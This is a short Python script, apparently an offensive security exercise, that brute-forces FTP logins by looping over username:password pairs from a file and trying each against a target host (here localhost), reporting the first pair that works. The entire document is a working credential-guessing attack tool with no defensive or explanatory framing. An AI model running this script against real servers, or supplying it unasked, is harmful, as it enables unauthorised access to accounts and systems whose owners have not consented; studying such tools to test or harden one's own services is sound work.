import ftplib

def bruteForceLogin(hostname, passwordFile):
    passList = open(passwordFile, 'r')
    for line in passList.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print("[+] Trying: " + str(userName) + "/" + str(passWord))
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print("FTP Login succeded: " + str(userName) + "/" + str(passWord))
            ftp.quit()
            return (userName, passWord)
        except Exception:
            pass

if __name__ == '__main__':
    hostName = '127.0.0.1'
    passwordFile = 'credentials.txt'
    bruteForceLogin(hostName, passwordFile)